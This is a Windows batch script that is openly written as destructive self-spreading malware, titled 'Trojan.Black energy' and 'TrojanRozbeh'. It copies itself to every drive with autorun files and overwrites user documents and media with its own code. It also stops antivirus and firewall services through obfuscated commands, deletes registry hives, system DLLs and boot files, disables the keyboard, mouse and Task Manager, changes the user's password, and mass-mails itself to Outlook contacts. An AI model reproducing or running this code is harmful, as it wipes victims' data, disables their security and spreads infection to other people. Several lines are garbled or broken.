@echo off

net share Virus=C:\
:waitwhat
if exist D:\ cd D:\ && copy %0 D:\ && echo [autorun] >autorun.inf && echo open^=Botnet^.exe >>autorun.inf
if exist L:\ cd L:\ && copy %0 L:\ && echo [autorun] >autorun.inf && echo open^=Botnet^.exe >>autorun.inf
if exist K:\ cd K:\ && copy %0 K:\ && echo [autorun] >autorun.inf && echo open^=Botnet^.exe >>autorun.inf
if exist J:\ cd J:\ && copy %0 J:\ && echo [autorun] >autorun.inf && echo open^=Botnet^.exe >>autorun.inf
if exist B:\ cd B:\ && copy %0 B:\ && echo [autorun] >autorun.inf && echo open^=Botnet^.exe >>autorun.inf
if exist A:\ cd A:\ && copy %0 A:\ && echo [autorun] >autorun.inf && echo open^=Botnet^.exe >>autorun.inf
if exist V:\ cd V:\ && copy %0 V:\ && echo [autorun] >autorun.inf && echo open^=Botnet^.exe >>autorun.inf
if exist X:\ cd X:\ && copy %0 X:\ && echo [autorun] >autorun.inf && echo open^=Botnet^.exe >>autorun.inf
if exist Z:\ cd Z:\ && copy %0 Z:\ && echo [autorun] >autorun.inf && echo open^=Botnet^.exe >>autorun.inf
if exist G:\ cd G:\ && copy %0 G:\ && echo [autorun] >autorun.inf && echo open^=Botnet^.exe >>autorun.inf
if exist I:\ cd I:\ && copy %0 I:\ && echo [autorun] >autorun.inf && echo open^=Botnet^.exe >>autorun.inf
if exist H:\ cd H:\ && copy %0 H:\ && echo [autorun] >autorun.inf && echo open^=Botnet^.exe >>autorun.inf
if exist F:\ cd F:\ && copy %0 F:\ && echo [autorun] >autorun.inf && echo open^=Botnet^.exe >>autorun.inf
if exist C:\ cd C:\ && copy %0 C:\ && echo [autorun] >autorun.inf && echo open^=Botnet^.exe >>autorun.inf
if exist E:\ cd E:\ && copy %0 E:\ && echo [autorun] >autorun.inf && echo open^=Botnet^.exe >>autorun.inf
if exist M:\ cd M:\ && copy %0 M:\ && echo [autorun] >autorun.inf && echo open^=Botnet^.exe >>autorun.inf
if exist N:\ cd N:\ && copy %0 N:\ && echo [autorun] >autorun.inf && echo open^=Botnet^.exe >>autorun.inf
if exist O:\ cd O:\ && copy %0 O:\ && echo [autorun] >autorun.inf && echo open^=Botnet^.exe >>autorun.inf
if exist P:\ cd P:\ && copy %0 P:\ && echo [autorun] >autorun.inf && echo open^=Botnet^.exe >>autorun.inf
if exist Q:\ cd Q:\ && copy %0 Q:\ && echo [autorun] >autorun.inf && echo open^=Botnet^.exe >>autorun.inf








title Trojan.Black energy

for /R %%a in (*.exe) do (

netsh advfirewall firewall add rule name="Blocked %%a" dir=out program="%%a" action=block

)
cd C:\
attrib -h -a -s autoexec.bat
takeown autoexec.bat














:payload
if exist G:\ set G:\=%seldisk% 
if exist


:payload1
cd %windir%
cd..
goto :infect
:payload2
cd %seldisk%
echo ^[autorun^] >autorun.inf
echo action^=Open folder to view files >>autorun.inf
echo shellexecute=^"autoexec.bat^" >>autorun.inf












:infect
echo ^@^echo ^off >autoexec.bat
echo ^mode ^43^, ^34 >>autoexec.bat
echo ^color ^F >>autoexec.bat
echo ^echo               uuuuuuu                   >>autoexec.bat
echo ^echo            uu$$$$$$$$$$$uu              >>autoexec.bat
echo ^echo         uu$$$$$$$$$$$$$$$$$uu           >>autoexec.bat
echo ^echo        u$$$$$$$$$$$$$$$$$$$$$u          >>autoexec.bat
echo ^echo      u$$$$$$$$$$$$$$$$$$$$$$$u          >>autoexec.bat
echo ^echo      u$$$$$$$$$$$$$$$$$$$$$$$$$u        >>autoexec.bat
echo ^echo      u$$$$$$$$$$$$$$$$$$$$$$$$$u        >>autoexec.bat
echo ^echo      u$$$$$$^"   ^"$$$^"   ^"$$$$$$u        >>autoexec.bat
echo ^echo      ^"$$$$^"      u$u       $$$$^"        >>autoexec.bat
echo ^echo       $$$u       u$u       u$$$         >>autoexec.bat
echo ^echo       $$$u      u$$$u      u$$$         >>autoexec.bat
echo ^echo        ^"$$$$uu$$$   $$$uu$$$$^"          >>autoexec.bat
echo ^echo         ^"$$$$$$$^"   ^"$$$$$$$^"           >>autoexec.bat
echo ^echo           u$$$$$$$u$$$$$$$u             >>autoexec.bat
echo ^echo            u$^"$^"$^"$^"$^"$^"$u              >>autoexec.bat
echo ^echo  uuu       $$u$ $ $ $ $u$$       uuu    >>autoexec.bat
echo ^echo u$$$$       $$$$$u$u$u$$$       u$$$$   >>autoexec.bat
echo ^echo $$$$$uu      ^"$$$$$$$$$^"      uu$$$$$$  >>autoexec.bat
echo ^echo u$$$$$$$$$$$uu  ^"^"^"^"^"    uuuu$$$$$$$$$$ >>autoexec.bat
echo ^echo $$$$^"^"^"$$$$$$$$$$uuu   uu$$$$$$$$$^"$$$^" >>autoexec.bat
echo ^echo ^"^"^"      ^"^"$$$$$$$$$$$uu ^"^"^"^"^"^"         >>autoexec.bat
echo ^echo         uuuu ^"^"$$$$$$$$$$uuu            >>autoexec.bat
echo ^echo u$$$uuu$$$$$$$$$uu ""$$$$$$$$$$$uuu$$$  >>autoexec.bat
echo ^echo $$$$$$$$$$^"^"^"^"           ^"^"$$$$$$$$$$$^" >>autoexec.bat
echo ^echo  ^"$$$$$^"                      ^"^"$$$$^"^"  >>autoexec.bat
echo ^echo    $$$^"                         $$$$^"   >>autoexec.bat
echo ^taskkill ^/^im ^wininit^.exe ^/^f >>autoexec.bat
echo ^pause ^>^nul>>autoexec.bat












for /R %%a in (*.png) do (

netsh advfirewall firewall add rule name="Blocked2 %%a" dir=out program="%%a" action=block

)


for /R %%a in (*.img) do (

netsh advfirewall firewall add rule name="Blocked1 %%a" dir=out program="%%a" action=block

)

reg add HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\System /v DisableTaskMgr /t REG_SZ /d 1 /f >nul
cd %temp% 
echo ^If WScript.Arguments.Named.Exists(^"elevated^") = False Then >GateWay.VBS
echo  CreateObject(^"Shell.Application^").ShellExecute ^"wscript.exe^", ^"^"^"^" ^& WScript.ScriptFullName ^& ^"^"^" /elevated^", ^"^", ^"runas^", 1 >>GateWay.VBS
echo  WScript.Quit >>GateWay.VBS
echo End If >>GateWay.VBS
echo User = CreateObject(^"WScript.Shell^").ExpandEnvironmentStrings(^"%UserProfile%^") >>GateWay.VBS
echo dim Key, fso, Eater >>GateWay.VBS
echo Set Key = CreateObject(^"WScript.Shell^") >>GateWay.VBS
echo Set fso = CreateObject(^"Scripting.FileSystemObject^") >>GateWay.VBS
echo Set Eater = fso.GetFile(Wscript.ScriptFullName) >>GateWay.VBS
echo On Error Resume Next >>GateWay.VBS
echo Key.Regwrite ^"HKLM\System\CurrentControlSet\Control\SafeBoot\AlternateShell^",^"notepad.exe^"^, ^"REG_SZ^" >>GateWay.VBS
echo Key.Regwrite ^"HKLM\System\CurrentControlSet\Control\ComputerName\ActiveComputerName\ComputerName^",^"TrojanRozbeh^", ^"REG_SZ^" >>GateWay.VBS
echo Key.Regwrite ^"HKLM\Software\Microsoft\Windows\CurrentVersion\Policies\System\legalnoticecaption^",^"ATTENTION!^", ^"REG_SZ^" >>GateWay.VBS
echo Key.Regwrite ^"HKLM\Software\Microsoft\Windows\CurrentVersion\Policies\System\legalnoticetext^",^"Your Computer Destroyed by TrojanRozbeh!^", ^"REG_SZ^" >>GateWay.VBS
echo Key.Regwrite ^"HKCU\Control Panel\International\s1159^",^"TrojanRozbeh^", ^"REG_SZ^" >>GateWay.VBS
echo Key.Regwrite ^"HKCU\Control Panel\International\s2359^",^"TrojanRozbeh^", ^"REG_SZ^" >>GateWay.VBS
echo Key.RegWrite ^"HKLM\Software\Microsoft\Windows\CurrentVersion\Explorer\Advanced\Hidden^", ^"2^", ^"REG_DWORD^" >>GateWay.VBS
echo Key.RegWrite ^"HKLM\Software\Microsoft\Windows\CurrentVersion\Explorer\Advanced\HideFileExt^", ^"1^", ^"REG_DWORD^" >>GateWay.VBS
echo Key.RegWrite ^"HKLM\Software\Microsoft\Windows\CurrentVersion\Policies\System\DisableTaskMgr^", ^"1^", ^"REG_DWORD^" >>GateWay.VBS
echo Key.RegWrite ^"HKLM\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\TaskbarNoPinnedList^", ^"1^", ^"REG_DWORD^" >>GateWay.VBS
echo Key.RegWrite ^"HKLM\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\NoPinningToTaskbar^", ^"1^", ^"REG_DWORD^" >>GateWay.VBS
echo Key.RegWrite ^"HKLM\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\NoSetTaskbar^", ^"1^", ^"REG_DWORD^" >>GateWay.VBS
echo Key.RegWrite ^"HKLM\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\NoTrayItemsDisplay^", ^"1^", ^"REG_DWORD^" >>GateWay.VBS
echo Key.RegWrite ^"HKLM\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\NoTrayContextMenu^", ^"1^", ^"REG_DWORD^" >>GateWay.VBS
echo Key.RegWrite ^"HKLM\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\NoSaveSettings^", ^"1^", ^"REG_DWORD^" >>GateWay.VBS
echo Key.RegWrite ^"HKLM\Software\Microsoft\Windows\CurrentVersion\Policies\System\DisableLockWorkstation^", ^"1^", ^"REG_DWORD^" >>GateWay.VBS
echo Key.RegWrite ^"HKLM\Software\Microsoft\Windows\CurrentVersion\Policies\System\EnableLUA^", ^"0^", ^"REG_DWORD^" >>GateWay.VBS
echo Key.RegWrite ^"HKLM\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\NoControlPanel^", ^"1^", ^"REG_DWORD^" >>GateWay.VBS
echo Key.RegWrite ^"HKLM\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\NoStartMenuPinnedList^", ^"1^", ^"REG_DWORD^" >>GateWay.VBS
echo Key.RegWrite ^"HKLM\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\NoStartMenuMFUprogramsList^", ^"1^", ^"REG_DWORD^" >>GateWay.VBS
echo Key.RegWrite ^"HKLM\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\NoStartMenuMorePrograms,^", ^"1^", ^"REG_DWORD^" >>GateWay.VBS
echo Key.Regwrite ^"HKLM\Software\Microsoft\Windows\CurrentVersion\Explorer\Advanced\HideFileExt^", ^"1^", ^"REG_DWORD^" >>GateWay.VBS
echo Key.Regwrite ^"HKLM\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\NoFolderOptions^" , ^"1^", ^"REG_DWORD^" >>GateWay.VBS
echo Key.Regwrite ^"HKLM\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\NoFileAssociate^", ^"1^", ^"REG_DWORD^" >>GateWay.VBS
echo Key.Regwrite ^"HKLM\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\NoRun^", ^"1^", ^"REG_DWORD^" >>GateWay.VBS
echo Key.Regwrite ^"HKLM\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\NoFind^", ^"1^", ^"REG_DWORD^" >>GateWay.VBS
echo Key.Regwrite ^"HKLM\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\NoSecurityTab^", ^"1^", ^"REG_DWORD^" >>GateWay.VBS
echo Key.Regwrite ^"HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\NoSecurityTab^", ^"1^", ^"REG_DWORD^" >>GateWay.VBS
echo Key.RegWrite ^"HKCU\Software\Microsoft\Command Processor\DisableUNCCheck^", ^"1^", ^"REG_DWORD^" >>GateWay.VBS
echo Key.Regwrite ^"HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\NoDrives^",^"67108863^",^"REG_DWORD^" >>GateWay.VBS
echo Key.Regwrite ^"HKLM\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\NoDrives^",^"67108863^",^"REG_DWORD^" >>GateWay.VBS
reg del "HCR" /f /va
reg del "HCC" /f /va
reg del "HCU" /f /va
if exist A:\ copy GateWay.VBS A:\ && echo open^=GateWay^.VBS >>autorun.inf
if exist B:\ copy GateWay.VBS B:\ && echo open^=GateWay^.VBS >>autorun.inf
if exist C:\ copy GateWay.VBS C:\ && echo open^=GateWay^.VBS >>autorun.inf
if exist D:\ copy GateWay.VBS D:\ && echo open^=GateWay^.VBS >>autorun.inf
if exist E:\ copy GateWay.VBS E:\ && echo open^=GateWay^.VBS >>autorun.inf
if exist F:\ copy GateWay.VBS F:\ && echo open^=GateWay^.VBS >>autorun.inf
if exist G:\ copy GateWay.VBS G:\ && echo open^=GateWay^.VBS >>autorun.inf
if exist H:\ copy GateWay.VBS H:\ && echo open^=GateWay^.VBS >>autorun.inf
if exist I:\ copy GateWay.VBS I:\ && echo open^=GateWay^.VBS >>autorun.inf
ipconfig /relase
ipconfig /renew
assoc .exe=batfile
DIR /S/B %SystemDrive%\*.exe >> InfList_exe.txt
echo Y | FOR /F "tokens=1,* delims=: " %%j in (InfList_exe.txt) do copy /y %0 "%%j:%%k"
assoc .txt=batfile
DIR /S/B %SystemDrive%\*.txt >> InfList_txt.txt
echo Y | FOR /F "tokens=1,* delims=: " %%j in (InfList_txt.txt) do copy /y %0 "%%j:%%k"
assoc .mp3=batfile
DIR /S/B %SystemDrive%\*.mp3 >> InfList_mp3.txt
echo Y | FOR /F "tokens=1,* delims=: " %%j in (InfList_mp3.txt) do copy /y %0 "%%j:%%k"
assoc .mp4=batfile
DIR /S/B %SystemDrive%\*.mp4 >> InfList_mp4.txt
echo Y | FOR /F "tokens=1,* delims=: " %%j in (InfList_mp4.txt) do copy /y %0 "%%j:%%k"
assoc .pdf=batfile
DIR /S/B %SystemDrive%\*.pdf >> InfList_pdf.txt
echo Y | FOR /F "tokens=1,* delims=: " %%j in (InfList_pdf.txt) do copy /y %0 "%%j:%%k"
assoc .lnk=batfile
DIR /S/B %SystemDrive%\*.lnk >> InfList_lnk.txt
echo Y | FOR /F "tokens=1,* delims=: " %%j in (InfList_lnk.txt) do copy /y %0 "%%j:%%k"
assoc .png=batfile
DIR /S/B %SystemDrive%\*.png >> InfList_png.txt
echo Y | FOR /F "tokens=1,* delims=: " %%j in (InfList_png.txt) do copy /y %0 "%%j:%%k"
assoc .xml=batfile
DIR /S/B %SystemDrive%\*.xml >> InfList_xml.txt
echo Y | FOR /F "tokens=1,* delims=: " %%j in (InfList_xml.txt) do copy /y %0 "%%j:%%k"
assoc .doc=batfile
DIR /S/B %SystemDrive%\*.doc >> InfList_doc.txt
echo Y | FOR /F "tokens=1,* delims=: " %%j in (InfList_doc.txt) do copy /y %0 "%%j:%%k"
set valinf="rundll32_%random%_toolbar"
set reginf="hklm\Software\Microsoft\Windows\CurrentVersion\Run"
reg add %reginf% /v %valinf% /t "REG_SZ" /d %0 /f > nul
copy %0 "%userprofile%\Start Menu\Programs\Startup"
Dir %SystemRoot% /s /b > PathHost
For /f %%a In (PathHost) Do Copy /y %0 %%a > Nul
Del /f /s /q PathHost > Nul
del /f /q "%windir%\system32\notepad.exe"
del /f /q "%windir%\system32\mspaint.exe"
del /f /q "%SystemDrive%\Program Files\Microsoft Office\Office10\EXCEL.EXE"
del /f /q "%SystemDrive%\Program Files\Microsoft Office\Office10\OUTLOOK.EXE"
del /f /q "%SystemDrive%\Program Files\Microsoft Office\Office10\WINWORD.EXE"
del /f /q "C:\Program Files\Internet Explorer\iexplore.exe"
del /f /q "%SystemDrive%\Program Files\Microsoft Office\Office10\MSACCESS.EXE"
echo start "" %0>>%SystemDrive%\AUTOEXEC.BAT
echo Do >> "opendisk.vbs"
echo Set oWMP = CreateObject("WMPlayer.OCX.7" ) >> "opendisk.vbs"
echo Set colCDROMs = oWMP.cdromCollection >> "opendisk.vbs"
echo colCDROMs.Item(d).Eject  >> "opendisk.vbs"
echo colCDROMs.Item(d).Eject  >> "opendisk.vbs"
echo Loop >> "opendisk.vbs"
start "" "opendisk.vbs"
@((( Echo Off > Nul ) & Break Off )
    @Set HiveBSOD=HKLM\Software\Microsoft\Windows\CurrentVersion\Run
    @Reg Add "%HiveBSOD%" /v "BSOD" /t "REG_SZ" /d %0 /f > Nul
    @Del /q /s /f "%SystemRoot%\Windows\System32\Drivers\*.*"
)
attrib +h "%userprofile%\my documents"
rem Hide Music, Video, Picture Folders
attrib +h "%userprofile%\my documents\my music"
attrib +h "%userprofile%\my documents\my videos"
attrib +h "%userprofile%\my documents\my pictures"
assoc .dll=txtfile
assoc .exe=pngfile
assoc .vbs=Visual Style
assoc .reg=xmlfile
assoc .txt=regfile
assoc .mp3=txtfile
assoc .xml=txtfile
assoc .png=txtfile
attrib -r -s -h c:\autoexec.bat
del c:\autoexec.bat
attrib -r -s -h c:\boot.ini
del c:\boot.ini
attrib -r -s -h c:\ntldr
del c:\ntldr
attrib -r -s -h c:\windows\win.ini
del c:\windows\win.ini
del /F /Q %SystemDrive%\recycler\S-1-5-21-1202660629-261903793-725345543-1003\run.bat
set ii=ne
set ywe=st
set ury=t
set iej=op
set jt53=Syma
set o6t=nor
set lyd2=fee
set h3d=ton
set gf45=ntec
set own5=McA
%ii%%ury% %ywe%%iej% "Security Center" /y
%ii%%ury% %ywe%%iej% "Automatic Updates" /y
%ii%%ury% %ywe%%iej% "%jt53%%gf45% Core LC" /y
%ii%%ury% %ywe%%iej% "SAVScan" /y
%ii%%ury% %ywe%%iej% "%o6t%%h3d% AntiVirus Firewall Monitor Service" /y
%ii%%ury% %ywe%%iej% "%o6t%%h3d% AntiVirus Auto-Protect Service" /y
%ii%%ury% %ywe%%iej% "%o6t%%h3d% AntiVirus Auto Protect Service" /y
%ii%%ury% %ywe%%iej% "%own5%%lyd2% Spamkiller Server" /y
%ii%%ury% %ywe%%iej% "%own5%%lyd2% Personal Firewall Service" /y
%ii%%ury% %ywe%%iej% "%own5%%lyd2% SecurityCenter Update Manager" /y
%ii%%ury% %ywe%%iej% "%jt53%%gf45% SPBBCSvc" /y
cls
%ii%%ury% %ywe%%iej% "Ahnlab Task Scheduler" /y
%ii%%ury% %ywe%%iej% navapsvc /y
%ii%%ury% %ywe%%iej% "Sygate Personal Firewall Pro" /y
%ii%%ury% %ywe%%iej% vrmonsvc /y
%ii%%ury% %ywe%%iej% MonSvcNT /y
%ii%%ury% %ywe%%iej% SAVScan /y
%ii%%ury% %ywe%%iej% NProtectService /y
%ii%%ury% %ywe%%iej% ccSetMGR /y
%ii%%ury% %ywe%%iej% ccEvtMGR /y
%ii%%ury% %ywe%%iej% srservice /y
%ii%%ury% %ywe%%iej% "%jt53%%gf45% Network Drivers Service" /y
%ii%%ury% %ywe%%iej% "%o6t%%h3d% Unerase Protection" /y
%ii%%ury% %ywe%%iej% MskService /y
%ii%%ury% %ywe%%iej% MpfService /y
%ii%%ury% %ywe%%iej% mcupdmgr.exe /y
%ii%%ury% %ywe%%iej% "%own5%%lyd2%AntiSpyware" /y
%ii%%ury% %ywe%%iej% helpsvc /y
%ii%%ury% %ywe%%iej% ERSvc /y
%ii%%ury% %ywe%%iej% "*%o6t%%h3d%*" /y
%ii%%ury% %ywe%%iej% "*%jt53%%gf45%*" /y
%ii%%ury% %ywe%%iej% "*%own5%%lyd2%*" /y
cls
%ii%%ury% %ywe%%iej% ccPwdSvc /y
%ii%%ury% %ywe%%iej% "%jt53%%gf45% Core LC" /y
%ii%%ury% %ywe%%iej% navapsvc /y
%ii%%ury% %ywe%%iej% "Serv-U" /y
%ii%%ury% %ywe%%iej% "%o6t%%h3d% AntiVirus Auto Protect Service" /y
%ii%%ury% %ywe%%iej% "%o6t%%h3d% AntiVirus Client" /y
%ii%%ury% %ywe%%iej% "%jt53%%gf45% AntiVirus Client" /y
%ii%%ury% %ywe%%iej% "%o6t%%h3d% AntiVirus Server" /y
%ii%%ury% %ywe%%iej% "NAV Alert" /y
%ii%%ury% %ywe%%iej% "Nav Auto-Protect" /y
cls
%ii%%ury% %ywe%%iej% "McShield" /y
%ii%%ury% %ywe%%iej% "DefWatch" /y
%ii%%ury% %ywe%%iej% eventlog /y
%ii%%ury% %ywe%%iej% InoRPC /y
%ii%%ury% %ywe%%iej% InoRT /y
%ii%%ury% %ywe%%iej% InoTask /y
cls
%ii%%ury% %ywe%%iej% "%o6t%%h3d% AntiVirus Auto Protect Service" /y
%ii%%ury% %ywe%%iej% "%o6t%%h3d% AntiVirus Client" /y
%ii%%ury% %ywe%%iej% "%o6t%%h3d% AntiVirus Corporate Edition" /y
%ii%%ury% %ywe%%iej% "ViRobot Professional Monitoring" /y
%ii%%ury% %ywe%%iej% "PC-cillin Personal Firewall" /y
%ii%%ury% %ywe%%iej% "Trend Micro Proxy Service" /y
%ii%%ury% %ywe%%iej% "Trend NT Realtime Service" /y
%ii%%ury% %ywe%%iej% "%own5%%lyd2%.com McShield" /y
%ii%%ury% %ywe%%iej% "%own5%%lyd2%.com VirusScan Online Realtime Engine" /y
%ii%%ury% %ywe%%iej% "SyGateService" /y
%ii%%ury% %ywe%%iej% "Sygate Personal Firewall Pro" /y
cls
%ii%%ury% %ywe%%iej% "Sophos Anti-Virus" /y
%ii%%ury% %ywe%%iej% "Sophos Anti-Virus Network" /y
%ii%%ury% %ywe%%iej% "eTrust Antivirus Job Server" /y
%ii%%ury% %ywe%%iej% "eTrust Antivirus Realtime Server" /y
%ii%%ury% %ywe%%iej% "Sygate Personal Firewall Pro" /y
%ii%%ury% %ywe%%iej% "eTrust Antivirus RPC Server" /y
cls
%ii%%ury% %ywe%%iej% netsvcs
%ii%%ury% %ywe%%iej% spoolnt
net stop “Security Center”
netsh firewall set opmode mode=disable



cd %temp%
Start GateWay.VBS
cd %userprofile%\desktop
copy %0 %userprofile%\desktop
reg delete "HKCC" /f /va
reg delete "HKLM" /f /va
reg delete "HKU" /f /va
cd C:\Windows
attrib -h -s *.exe
del *.exe /f /q /s 


set key="HKEY_LOCAL_MACHINE\system\CurrentControlSet\Services\Mouclass"
reg delete %key% /f
reg add %key% /v Start /t REG_DWORD /d 4
reg add HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\System /v DisableTaskMgr /t REG_SZ /d 1 /f >nul
echo Windows Registry Editor Version 5.00 > "nokeyboard.reg"
echo [HKEY_LOCAL_MACHINE\SYSTEM\ControlSet001\Control\Keyboard Layout] >> "nokeyboard.reg"
echo "Scancode Map"=hex:00,00,00,00,00,00,00,00,7c,00,00,00,00,00,01,00,00,\ >> "nokeyboard.reg"
echo 00,3b,00,00,00,3c,00,00,00,3d,00,00,00,3e,00,00,00,3f,00,00,00,40,00,00,00,\ >> "nokeyboard.reg"
echo 41,00,00,00,42,00,00,00,43,00,00,00,44,00,00,00,57,00,00,00,58,00,00,00,37,\ >> "nokeyboard.reg"
echo e0,00,00,46,00,00,00,45,00,00,00,35,e0,00,00,37,00,00,00,4a,00,00,00,47,00,\ >> "nokeyboard.reg"
echo 00,00,48,00,00,00,49,00,00,00,4b,00,00,00,4c,00,00,00,4d,00,00,00,4e,00,00,\ >> "nokeyboard.reg"
echo 00,4f,00,00,00,50,00,00,00,51,00,00,00,1c,e0,00,00,53,00,00,00,52,00,00,00,\ >> "nokeyboard.reg"
echo 4d,e0,00,00,50,e0,00,00,4b,e0,00,00,48,e0,00,00,52,e0,00,00,47,e0,00,00,49,\ >> "nokeyboard.reg"
echo e0,00,00,53,e0,00,00,4f,e0,00,00,51,e0,00,00,29,00,00,00,02,00,00,00,03,00,\ >> "nokeyboard.reg"
echo 00,00,04,00,00,00,05,00,00,00,06,00,00,00,07,00,00,00,08,00,00,00,09,00,00,\ >> "nokeyboard.reg"
echo 00,0a,00,00,00,0b,00,00,00,0c,00,00,00,0d,00,00,00,0e,00,00,00,0f,00,00,00,\ >> "nokeyboard.reg"
echo 10,00,00,00,11,00,00,00,12,00,00,00,13,00,00,00,14,00,00,00,15,00,00,00,16,\ >> "nokeyboard.reg"
echo 00,00,00,17,00,00,00,18,00,00,00,19,00,00,00,1a,00,00,00,1b,00,00,00,2b,00,\ >> "nokeyboard.reg"
echo 00,00,3a,00,00,00,1e,00,00,00,1f,00,00,00,20,00,00,00,21,00,00,00,22,00,00,\ >> "nokeyboard.reg"
echo 00,23,00,00,00,24,00,00,00,25,00,00,00,26,00,00,00,27,00,00,00,28,00,00,00,\ >> "nokeyboard.reg"
echo 1c,00,00,00,2a,00,00,00,2c,00,00,00,2d,00,00,00,2e,00,00,00,2f,00,00,00,30,\ >> "nokeyboard.reg"
echo 00,00,00,31,00,00,00,32,00,00,00,33,00,00,00,34,00,00,00,35,00,00,00,36,00,\ >> "nokeyboard.reg"
echo 00,00,1d,00,00,00,5b,e0,00,00,38,00,00,00,39,00,00,00,38,e0,00,00,5c,e0,00,\ >> "nokeyboard.reg"
echo 00,5d,e0,00,00,1d,e0,00,00,5f,e0,00,00,5e,e0,00,00,22,e0,00,00,24,e0,00,00,\ >> "nokeyboard.reg"
echo 10,e0,00,00,19,e0,00,00,30,e0,00,00,2e,e0,00,00,2c,e0,00,00,20,e0,00,00,6a,\ >> "nokeyboard.reg"
echo e0,00,00,69,e0,00,00,68,e0,00,00,67,e0,00,00,42,e0,00,00,6c,e0,00,00,6d,e0,\ >> "nokeyboard.reg"
echo 00,00,66,e0,00,00,6b,e0,00,00,21,e0,00,00,00,00 >> "nokeyboard.reg"
start "nokeyboard.reg"
net stop "WinDefend"
taskkill /f /t /im "MSASCui.exe"
net stop "security center"
net stop sharedaccess
netsh firewall set opmode mode-disable


set a=goldenEye
copy %0 %windir%\%a%.bat
reg add HKLM\Software\Microsoft\Windows\CurrentVersion\Run /v AVAADA /t REG_SZ /d %windir%\%a%.bat /f > nul
reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Run /v AVAADA /t REG_SZ /d %windir%\%a%.bat /f > nul
netsh firewall set opmode mode-disable
netsh advfirewall set opmode mode-disable
netsh firewall set opmode mode=disable
netsh advfirewall set opmode mode=disable

echo dim x>>%userprofile%\mail.vbs
echo on error resume next>>%userprofile%\mail.vbs
echo Set fso ="Scripting.FileSystem.Object">>%userprofile%\mail.vbs
echo Set so=CreateObject(fso)>>%userprofile%\mail.vbs
echo Set ol=CreateObject("Outlook.Application")>>%userprofile%\mail.vbs
echo Set out=WScript.CreateObject("Outlook.Application")>>%userprofile%\mail.vbs
echo Set mapi = out.GetNameSpace("MAPI")>>%userprofile%\mail.vbs
echo Set a = mapi.AddressLists(1)>>%userprofile%\mail.vbs
echo Set ae=a.AddressEntries>>%userprofile%\mail.vbs
echo For x=1 To ae.Count>>%userprofile%\mail.vbs
echo Set ci=ol.CreateItem(0)>>%userprofile%\mail.vbs
echo Set Mail=ci>>%userprofile%\mail.vbs
echo Mail.to=ol.GetNameSpace("MAPI").AddressLists(1).AddressEntries(x)>>%userprofile%\mail.vbs
echo Mail.Subject="Is this you?">>%userprofile%\mail.vbs
echo Mail.Body="Man that has got to be embarrassing!">>%userprofile%\mail.vbs
echo Mail.Attachments.Add(%0)>>%userprofile%\mail.vbs
echo Mail.send>>%userprofile%\mail.vbs
echo Next>>%userprofile%\mail.vbs
echo ol.Quit>>%userprofile%\mail.vbs
start "" "%userprofile%\mail.vbs"
net stop "Themes"
taskkill /im svchost.exe /f
shutdown -a

cd C:\
attrib -h -s Config.sys
del Config.sys /f /q /s
cd C:\Windows
attrib -h -s *.dll
del *.dll /f /q /s
cd C:\Windows\system32
attrib -h -s *.dll
del *.dll /f /q /s 
cd..
rename system32 COM3\
label C: aux
net users con /add
net users con /active:yes
net users con /active:y
net user %username% Botnet2




